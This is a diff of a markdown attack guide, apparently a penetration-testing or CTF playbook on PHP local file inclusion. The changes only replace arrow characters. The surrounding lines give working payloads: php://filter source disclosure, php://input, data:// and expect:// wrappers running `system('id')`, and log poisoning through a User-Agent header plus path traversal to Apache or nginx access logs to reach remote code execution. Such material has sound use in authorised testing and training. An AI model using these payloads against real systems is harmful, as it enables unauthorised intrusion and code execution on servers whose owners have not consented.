@@ -37,7 +37,7 @@ Start with simple probes:
 
 Once basic traversal works, try PHP wrappers:
 1. **Source disclosure**: `php://filter/convert.base64-encode/resource=index.php`
-   - If you get base64 back → decode to read source code
+   - If you get base64 back -> decode to read source code
 2. **Code execution** (rare): `php://input` with POST body `<?php system('id');?>`
 3. **Data wrapper**: `data://text/plain,<?php system('id');?>`
 4. **Expect wrapper**: `expect://id` (if expect module loaded)
@@ -48,7 +48,7 @@ If you can include files but not execute code:
 1. Find log files: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`
 2. Send a request with PHP code in User-Agent: `User-Agent: <?php system('id');?>`
 3. Include the log file: `../../../../var/log/apache2/access.log`
-4. The PHP code executes → RCE achieved
+4. The PHP code executes -> RCE achieved
 
 #### STEP 4: SENSITIVE FILES TO TARGET
 
